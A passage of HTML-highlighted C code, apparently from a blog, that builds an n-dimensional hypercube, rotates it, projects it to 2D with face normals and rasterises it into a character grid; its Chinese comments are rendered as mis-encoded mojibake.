class="comment">//è¿™ä¸ªç®—æ³•éœ€è¦æœ‰å‰è½¦ä¹‹é‰´</span></span><br><span class="line">    <span class="comment">/*å¾—åˆ°é¡¶ç‚¹åæ ‡</span></span><br><span class="line"><span class="comment">    ç”¨ä¸Šä¸€å‘é‡ä¸€ä¸ªå…ƒç´ å˜å·ï¼Œä½¿å…¶ä¸ä¹‹å‰ä»»ä¸€å‘é‡éƒ½ä¸åŒï¼Œè¯¥å‘é‡å³è¦æ‰¾çš„ä¸‹ä¸€ä¸ªé¡¶ç‚¹</span></span><br><span class="line"><span class="comment">    å‘é‡ä¸åŒ = å…ƒç´ è‡³å°‘æœ‰ä¸€ä¸ªä¸ç›¸åŒ*/</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">2</span>,difference,sign,i;vexIndex*dimension&lt;vexNum;vexIndex++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(sign=<span class="number">0</span>;sign&lt;dimension;sign++)&#123;<span class="comment">//éå†å°è¯•æ”¹å˜vexIndex-1å‘é‡çš„æ¯ä¸€å•ä¸ªå…ƒç´ æ­£è´Ÿå·ï¼Œæ‰§è¡Œæ¡ä»¶ï¼šdä¸ºå‡</span></span><br><span class="line">            <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;vexIndex<span class="number">-1</span>;i++)&#123;difference=<span class="number">0</span>;<span class="comment">//éå†æ¯ä¸ªå‘é‡ï¼Œæ‰§è¡Œæ¡ä»¶ï¼šdä¸ºçœŸï¼Œæ¯æ¬¡åˆå§‹åŒ–dä¸ºå‡</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;dimension&amp;&amp;!difference;k++)<span class="comment">//éå†æ¯”è¾ƒvexIndex-1å‘é‡ä¸ä¹‹å‰å‘é‡çš„å…ƒç´ </span></span><br><span class="line">                    <span class="keyword">if</span>(sign==k?vex[i*dimension+k]!=<span class="number">-1</span>*vex[(vexIndex<span class="number">-1</span>)*dimension+k]:vex[i*dimension+k]!=vex[(vexIndex<span class="number">-1</span>)*dimension+k]) difference=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>(!difference) <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(difference) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;dimension;k++) vex[vexIndex*dimension+k]=k==sign?<span class="number">-1</span>*vex[(vexIndex<span class="number">-1</span>)*dimension+k]:vex[(vexIndex<span class="number">-1</span>)*dimension+k];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*æµ‹è¯•ä»£ç ï¼šæ‰“å°vex</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;vexNum/dimension;i++)&#123;</span></span><br><span class="line"><span class="comment">        if(i&lt;10) printf(&quot; %d= &quot;,i);</span></span><br><span class="line"><span class="comment">        else printf(&quot;%d= &quot;,i);</span></span><br><span class="line"><span class="comment">        for(int j=0;j&lt;dimension;j++)&#123;</span></span><br><span class="line"><span class="comment">            if(vex[i*dimension+j]&gt;=0)printf(&quot; %.0f,&quot;,vex[i*dimension+j]);</span></span><br><span class="line"><span class="comment">            else printf(&quot;%.0f,&quot;,vex[i*dimension+j]);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        printf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    printf(&quot;Vex Above\n&quot;);</span></span><br><span class="line"><span class="comment">    //*/</span></span><br><span class="line">    <span class="comment">/*å¾—åˆ°ç›¸é‚»é¡¶ç‚¹ï¼Œç›¸é‚»é¡¶ç‚¹åœ¨vexä¸­çš„indexå­˜å‚¨åˆ°vexLinkä¸­</span></span><br><span class="line"><span class="comment">    å…ˆåœ¨vexLinkä¸­å·²ç»å»ºç«‹linkçš„éƒ¨åˆ†æ‰¾æœ‰æ²¡æœ‰ä¹‹å‰linkåˆ°è¿‡å½“å‰æ­£åœ¨å»ºç«‹linkçš„ç‚¹ï¼Œæœ‰åˆ™ç›´æ¥åŠ å…¥å½“å‰çš„link</span></span><br><span class="line"><span class="comment">    linkIndexï¼šè¿™æ˜¯ç¬¬å‡ ä¸ªå·²ç»å»ºç«‹linkçš„ç‚¹</span></span><br><span class="line"><span class="comment">    åœ¨linkæ•°é‡è¾¾åˆ°dimensionä¹‹å‰ï¼Œç”¨å½“å‰å‘é‡ä¸ä¹‹å‰çš„å‘é‡ä½œæ¯”è¾ƒï¼Œå¦‚æœ_åª_æ›´_æ”¹_ä¸€_ä¸ª_ç¬¦_å·_å°±å¯ä»¥åŒ¹é…ï¼Œåˆ™åŠ å…¥linkï¼Œç›´åˆ°å½“å‰å‘é‡çš„linkæ»¡dimensionä¸ª*/</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>,n=<span class="number">0</span>;vexIndex*dimension&lt;vexNum;vexIndex++,n=<span class="number">0</span>)&#123;<span class="comment">//vexIndexï¼šå½“å‰æ­£åœ¨å»ºç«‹linkçš„ç‚¹ | nï¼šå·²ç»å»ºç«‹åˆ°ç¬¬å‡ ä¸ªlinkäº†</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> linkIndex=<span class="number">0</span>;linkIndex&lt;vexIndex;linkIndex++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;dimension;i++)</span><br><span class="line">                <span class="keyword">if</span>(vexLink[linkIndex*dimension+i]==vexIndex) vexLink[vexIndex*dimension+n++]=linkIndex;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=vexIndex+<span class="number">1</span>,difference=<span class="number">0</span>,tooManyDiff,sign;i*dimension&lt;vexNum&amp;&amp;n!=dimension;i++,difference=<span class="number">0</span>)&#123;<span class="comment">//éå†å½“å‰å‘é‡ä¹‹åçš„æ¯ä¸ªå‘é‡ || differenceï¼šå­˜åœ¨ä¸ä¸€æ ·çš„å…ƒç´ çš„æ•°é‡</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;dimension&amp;&amp;difference&lt;=<span class="number">1</span>;k++)<span class="comment">//éå†è¢«æ¯”è¾ƒå‘é‡ä¸­çš„æ¯ä¸ªå…ƒç´ </span></span><br><span class="line">                <span class="keyword">if</span>(vex[i*dimension+k]!=vex[vexIndex*dimension+k]) difference++;</span><br><span class="line">            <span class="keyword">if</span>(difference==<span class="number">1</span>) vexLink[vexIndex*dimension+n++]=i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*æµ‹è¯•ä»£ç ï¼šæ‰“å°vexLink</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;vexNum/dimension;i++)&#123;</span></span><br><span class="line"><span class="comment">        if(i&lt;10) printf(&quot; %d= &quot;,i);</span></span><br><span class="line"><span class="comment">        else printf(&quot;%d= &quot;,i);</span></span><br><span class="line"><span class="comment">        for(int j=0;j&lt;dimension;j++)&#123;</span></span><br><span class="line"><span class="comment">            if(vexLink[i*dimension+j]&gt;=10)printf(&quot;%d, &quot;,vexLink[i*dimension+j]);</span></span><br><span class="line"><span class="comment">            else printf(&quot; %d ,&quot;,vexLink[i*dimension+j]);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        printf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    printf(&quot;vexLink Above\n&quot;);</span></span><br><span class="line"><span class="comment">    //*/</span></span><br><span class="line">    <span class="comment">//å¾—åˆ°é¢å¯¹åº”çš„ä¸‰ä¸ªç‚¹</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> cur1=<span class="number">0</span>,normalIndex=<span class="number">0</span>;cur1&lt;vexNum/dimension&amp;&amp;normalIndex!=<span class="number">2</span>*face;cur1+=<span class="number">2</span>)<span class="comment">//cur n è¡¨ç¤ºæŒ‡å‘ç¬¬å‡ ä¸ªé¡¶ç‚¹ï¼ŒnormalIndexè¡¨è¿™æ˜¯å·²ç»æ‰¾åˆ°çš„ç¬¬å‡ ä¸ªä¸‰è§’å½¢</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> cur2=<span class="number">0</span>,pDiag=<span class="number">0</span>;cur2&lt;vexNum/dimension&amp;&amp;normalIndex!=<span class="number">2</span>*face;cur2++)&#123;<span class="comment">//pDiag(Plane Diagonal)è¡¨æ˜¯å¦ä¸ºå¹³é¢å¯¹è§’ç‚¹ï¼Œå³cur1é€šè¿‡Linkç´¢å¼•ï¼Œåœ¨ç¬¬äºŒæ¬¡å¯ä»¥ç´¢å¼•åˆ°cur2</span></span><br><span class="line">            <span class="keyword">if</span>(cur1==cur2) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;dimension&amp;&amp;!pDiag;i++)<span class="comment">//ç¬¬ä¸€æ¬¡ç´¢å¼•çš„åç§»</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;dimension&amp;&amp;!pDiag;j++)<span class="comment">//ç¬¬äºŒæ¬¡ç´¢å¼•çš„åç§»</span></span><br><span class="line">                    <span class="keyword">if</span>(vexLink[vexLink[cur1*dimension+i]*dimension+j]==cur2) pDiag=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(pDiag)&#123;</span><br><span class="line">                <span class="keyword">int</span> <span class="keyword">public</span>[dimension<span class="number">-1</span>];</span><br><span class="line">                <span class="built_in">memset</span>(<span class="keyword">public</span>,<span class="number">0xff</span>,<span class="keyword">sizeof</span>(<span class="keyword">public</span>));</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,k=<span class="number">0</span>;i&lt;dimension&amp;&amp;k&lt;dimension<span class="number">-1</span>;i++)</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;dimension&amp;&amp;k&lt;dimension<span class="number">-1</span>;j++)</span><br><span class="line">                        <span class="keyword">if</span>(vexLink[cur1*dimension+i]==vexLink[cur2*dimension+j]) <span class="keyword">public</span>[k++]=vexLink[cur1*dimension+i];</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=normalIndex;i++)<span class="comment">//iæŒ‡å‘normalLinkä¸­çš„å‘é‡</span></span><br><span class="line">                    <span class="keyword">if</span>  (   (cur1==normalLink[i*<span class="number">3</span>]||cur1==normalLink[i*<span class="number">3</span>+<span class="number">1</span>]||cur1==normalLink[i*<span class="number">3</span>+<span class="number">2</span>])<span class="comment">//cur1ä¸ç¬¬iä¸ªnormalLinkä¸­å­˜åœ¨å…ƒç´ é‡åˆï¼Ÿ</span></span><br><span class="line">                        &amp;&amp;  (cur2==normalLink[i*<span class="number">3</span>]||cur2==normalLink[i*<span class="number">3</span>+<span class="number">1</span>]||cur2==normalLink[i*<span class="number">3</span>+<span class="number">2</span>]))<span class="comment">//cur2ä¸ç¬¬iä¸ªnormalLinkä¸­å­˜åœ¨å…ƒç´ é‡åˆï¼Ÿ</span></span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;dimension<span class="number">-1</span>;j++)</span><br><span class="line">                            <span class="keyword">if</span>(<span class="keyword">public</span>[j]==normalLink[i*<span class="number">3</span>]||<span class="keyword">public</span>[j]==normalLink[i*<span class="number">3</span>+<span class="number">1</span>]||<span class="keyword">public</span>[j]==normalLink[i*<span class="number">3</span>+<span class="number">2</span>]) <span class="keyword">public</span>[j]=<span class="number">-1</span>;<span class="comment">//public[j]ä¸ç¬¬iä¸ªnormalLinkä¸­å­˜åœ¨å…ƒç´ é‡åˆï¼Ÿ</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;dimension<span class="number">-1</span>;i++)</span><br><span class="line">                    <span class="keyword">if</span>(<span class="keyword">public</span>[i]!=<span class="number">-1</span>)&#123;</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">3</span>;j++)normalLink[normalIndex*<span class="number">3</span>+j]=j==<span class="number">0</span>?cur1:j==<span class="number">1</span>?cur2:<span class="keyword">public</span>[i];</span><br><span class="line">                        normalIndex++;</span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">/*æµ‹è¯•ä»£ç ï¼šæ‰“å°normalLink</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;2*face;i++)&#123;</span></span><br><span class="line"><span class="comment">        //if(i&lt;10) printf(&quot; %d= &quot;,i);</span></span><br><span class="line"><span class="comment">        //else printf(&quot;%d= &quot;,i);</span></span><br><span class="line"><span class="comment">        for(int j=0;j&lt;3;j++)&#123;</span></span><br><span class="line"><span class="comment">            if(normalLink[i*3+j]&gt;=10) printf(&quot;%d, &quot;,normalLink[i*3+j]);</span></span><br><span class="line"><span class="comment">            else printf(&quot;0%d, &quot;,normalLink[i*3+j]);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        printf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    printf(&quot;normalLink Above\n&quot;);</span></span><br><span class="line"><span class="comment">    //*/</span></span><br><span class="line">    <span class="built_in">memcpy</span>(vexTemp,vex,<span class="keyword">sizeof</span>(vex[<span class="number">0</span>])*vexNum);</span><br><span class="line">    <span class="built_in">memcpy</span>(vexO,vex,<span class="keyword">sizeof</span>(vex[<span class="number">0</span>])*vexNum);</span><br><span class="line">    <span class="comment">//=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">float</span> angle=<span class="number">0</span>;;angle+=deltaA)&#123;<span class="comment">//å¤§å¾ªç¯</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;size;i++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size;j++)&#123;</span><br><span class="line">                out_f[i][j]=<span class="number">-1</span>;</span><br><span class="line">                dis[i][j]=(<span class="keyword">float</span>)(<span class="number">-4.0</span>*size);</span><br><span class="line">            &#125;<span class="comment">//åˆå§‹åŒ–</span></span><br><span class="line">        <span class="built_in">memcpy</span>(vex,vexO,<span class="keyword">sizeof</span>(vexO));<span class="comment">//è¿˜åŸvexåˆ°åˆå§‹çŠ¶æ€ï¼Œå¦åˆ™å¸¦è§’åŠ é€Ÿåº¦</span></span><br><span class="line">        <span class="comment">//è®¡ç®—å‘é‡ä¸æ—‹è½¬çŸ©é˜µç›¸ä¹˜ï¼Œ0å¤ªå¤šï¼Œæ²¡å¿…è¦æçœŸæ­£çš„çŸ©é˜µä¹˜æ³•</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>;vexIndex&lt;vexNum/dimension;vexIndex++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> rotationIndex=<span class="number">0</span>,r_i=<span class="number">0</span>;rotationIndex&lt;<span class="keyword">sizeof</span>(rotateAround)/<span class="keyword">sizeof</span>(rotateAround[<span class="number">0</span>])/<span class="number">2</span>;rotationIndex++,r_i=<span class="number">0</span>)&#123;<span class="comment">//é™å®šæ—‹è½¬æ¬¡æ•°ï¼›rotateAroundæ¯è¡Œ2ä¸ªå…ƒç´ ï¼Œjçš„ä½œç”¨æ˜¯é€‰å–ä»–ä»¬</span></span><br><span class="line">                <span class="built_in">memcpy</span>(vexTemp,vex,<span class="keyword">sizeof</span>(vex));</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;dimension;i++)<span class="comment">//éå†æ‰€æœ‰çš„è½´</span></span><br><span class="line">                    <span class="keyword">if</span>(i==rotateAround[rotationIndex*<span class="number">2</span>+r_i])<span class="comment">//å½“å‰è½´æ˜¯è¢«æ—‹è½¬è½´æ—¶ï¼Œç»“æœç¬¦åˆæ—‹è½¬çŸ©é˜µè®¡ç®—ç»“æœ</span></span><br><span class="line">                        vex[vexIndex*dimension+i]=vexTemp[vexIndex*dimension+i]*<span class="built_in">cos</span>(vAxis[rotationIndex]*angle)+vexTemp[vexIndex*dimension+rotateAround[rotationIndex*<span class="number">2</span>+!r_i]]*<span class="built_in">sin</span>(vAxis[rotationIndex]*angle)*(<span class="number">1</span><span class="number">-2</span>*r_i++);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;<span class="comment">//æ‘„åƒæœºæ—‹è½¬</span></span><br><span class="line">            <span class="built_in">memcpy</span>(vexTemp,vex,<span class="keyword">sizeof</span>(vex));</span><br><span class="line">            <span class="keyword">int</span> c=!(i^<span class="number">1</span>),b=i&lt;=<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>;vexIndex&lt;vexNum/dimension;vexIndex++) vex[vexIndex*dimension+!(i^<span class="number">1</span>)] = vexTemp[vexIndex*dimension+!(i^<span class="number">1</span>)]*<span class="built_in">cos</span>(initialCam[i]) + vexTemp[vexIndex*dimension+(i&lt;=<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>)]*<span class="built_in">sin</span>(initialCam[i]);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>;vexIndex&lt;vexNum/dimension;vexIndex++) vex[vexIndex*dimension+(i&lt;=<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>)] = vexTemp[vexIndex*dimension+(i&lt;=<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>)]*<span class="built_in">cos</span>(initialCam[i]) - vexTemp[vexIndex*dimension+!(i^<span class="number">1</span>)]*<span class="built_in">sin</span>(initialCam[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//ä»¥é€è§†æŠ•å½±é™ç»´</span></span><br><span class="line">        <span class="keyword">float</span> xyBefore[<span class="number">2</span>*vexNum];<span class="comment">//å¤‡ä»½xï¼Œyè½´ç”¨äºè®¡ç®—å¹³é¢æ–¹ç¨‹</span></span><br><span class="line">        <span class="built_in">memcpy</span>(vexProjected,vex,<span class="keyword">sizeof</span>(vex[<span class="number">0</span>])*vexNum);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> d=dimension<span class="number">-1</span>;d&gt;=<span class="number">2</span>;d--)&#123;<span class="comment">//d+1 = å½“å‰ç»´æ•°</span></span><br><span class="line">            <span class="keyword">if</span>(d==<span class="number">2</span>)&#123;<span class="comment">//è¶è¿˜åœ¨ä¸‰ç»´çš„æ—¶å€™å…ˆæŠŠæ³•å‘é‡ç®—äº†ï¼Œä¸ç„¶åå…‰çš„é¢å°±ä¹Ÿé€è§†äº†</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;vexNum/dimension;i++) <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=<span class="number">1</span>;j++) xyBefore[i*<span class="number">2</span>+j]=vexProjected[i*dimension+j];</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> normalIndex=<span class="number">0</span>;normalIndex&lt;<span class="number">2</span>*face;normalIndex++)&#123;</span><br><span class="line">                    <span class="keyword">float</span> vec1[<span class="number">3</span>],vec2[<span class="number">3</span>];</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">                        vec1[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>]*dimension+i]-vexProjected[normalLink[normalIndex*<span class="number">3</span>+<span class="number">1</span>]*dimension+i];</span><br><span class="line">                        vec2[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>]*dimension+i]-vexProjected[normalLink[normalIndex*<span class="number">3</span>+<span class="number">2</span>]*dimension+i];</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) normalResultSet[<span class="number">3</span>*normalIndex+i]=vec1[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">0</span>]*vec2[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">1</span>]-vec1[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">1</span>]*vec2[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">0</span>];</span><br><span class="line">                    <span class="keyword">float</span> normalLength=calLength(&amp;normalResultSet[<span class="number">3</span>*normalIndex],<span class="number">3</span>);</span><br><span class="line">                    <span class="keyword">if</span>(normalLength!=<span class="number">0</span>)</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) normalResultSet[<span class="number">3</span>*normalIndex+i]/=normalLength;</span><br><span class="line">                    <span class="keyword">if</span>(!transparent)&#123;<span class="comment">//ä»¥å…¨å±€è´¨å¿ƒè®¡ç®—ï¼Œä½¿æ³•å‘é‡å‘å¤–</span></span><br><span class="line">                        <span class="keyword">float</span> slidedVec[<span class="number">3</span>],slideLength,vexLength=calLength(&amp;vexProjected[normalLink[normalIndex*<span class="number">3</span>]*dimension],<span class="number">3</span>);</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) slidedVec[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>]*dimension+i]+normalResultSet[<span class="number">3</span>*normalIndex+i];</span><br><span class="line">                        slideLength=calLength(slidedVec,<span class="number">3</span>);</span><br><span class="line">                        <span class="keyword">if</span>(slideLength&gt;vexLength)</span><br><span class="line">                            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) normalResultSet[<span class="number">3</span>*normalIndex+i]*=<span class="number">-1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>;vexIndex&lt;vexNum/dimension;vexIndex++)<span class="comment">//vexIndexï¼šç¬¬å‡ ä¸ªå‘é‡ï¼Œaxisï¼šè¯¥å‘é‡çš„ç¬¬å‡ ä¸ªå…ƒç´ </span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> axis=<span class="number">0</span>;axis&lt;d;axis++) vexProjected[vexIndex*dimension+axis]=vexProjected[vexIndex*dimension+axis]*lightSrcDis/(lightSrcDis-vexProjected[vexIndex*dimension+d]);</span><br><span class="line">            <span class="comment">/*æµ‹è¯•ä»£ç ï¼šæ‰“å°vexProjected</span></span><br><span class="line"><span class="comment">            for(int i=0;i&lt;vexNum/dimension&amp;&amp;d&gt;2;i++)&#123;</span></span><br><span class="line"><span class="comment">                if(i&lt;10) printf(&quot; %d= &quot;,i);</span></span><br><span class="line"><span class="comment">                else printf(&quot;%d= &quot;,i);</span></span><br><span class="line"><span class="comment">                for(int j=0;j&lt;dimension;j++)&#123;</span></span><br><span class="line"><span class="comment">                    if(vexProjected[i*dimension+j]&gt;=0)printf(&quot; %.2f,&quot;,vexProjected[i*dimension+j]);</span></span><br><span class="line"><span class="comment">                    else printf(&quot;%.2f,&quot;,vexProjected[i*dimension+j]);</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment">                printf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">            if(d&gt;2) printf(&quot;VexPorjected Above , dimension = %d\n&quot;,d);</span></span><br><span class="line"><span class="comment">            //*/</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//è¾“å‡ºåˆ°out_f[]</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> sx=<span class="number">0</span>;sx&lt;size;sx++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> sy=<span class="number">0</span>;sy&lt;size;sy++)</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> normalIndex=<span class="number">0</span>,inside=<span class="number">1</span>;normalIndex&lt;<span class="number">2</span>*face;normalIndex++,inside=<span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="keyword">float</span> tCenter[<span class="number">2</span>]=&#123;<span class="number">0</span>&#125;;<span class="comment">//å½“å‰ä¸‰è§’å½¢è´¨å¿ƒ</span></span><br><span class="line">                    <span class="keyword">float</span> x[<span class="number">3</span>],y[<span class="number">3</span>],z[<span class="number">3</span>],xb[<span class="number">3</span>],yb[<span class="number">3</span>];</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">                        x[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>+i]*dimension];</span><br><span class="line">                        tCenter[<span class="number">0</span>]+=x[i];</span><br><span class="line">                        y[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>+i]*dimension+<span class="number">1</span>];</span><br><span class="line">                        tCenter[<span class="number">1</span>]+=y[i];</span><br><span class="line">                        z[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>+i]*dimension+<span class="number">2</span>];</span><br><span class="line">                        xb[i]=xyBefore[normalLink[normalIndex*<span class="number">3</span>+i]*<span class="number">2</span>];</span><br><span class="line">                        yb[i]=xyBefore[normalLink[normalIndex*<span class="number">3</span>+i]*<span class="number">2</span>+<span class="number">1</span>];</span><br><span class="line">                    &#125;</span><br><span class="line">                    tCenter[<span class="number">0</span>]/=<span class="number">3</span>;</span><br><span class="line">                    tCenter[<span class="number">1</span>]/=<span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>&amp;&amp;inside;i++)&#123;<span class="comment">//åˆ¤æ–­å½“å‰å±å¹•çš„ç‚¹æ˜¯å¦åœ¨ä¸‰è§’å½¢èŒƒå›´å†…</span></span><br><span class="line">                        <span class="keyword">if</span>(     ((tCenter[<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])&lt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(tCenter[<span class="number">0</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])</span><br><span class="line">                                ?(sy-move-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])&gt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(sx-move-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])</span><br><span class="line">                                :(sy-move-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])&lt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(sx-move-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>]))</span><br><span class="line">                                ||((tCenter[<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span 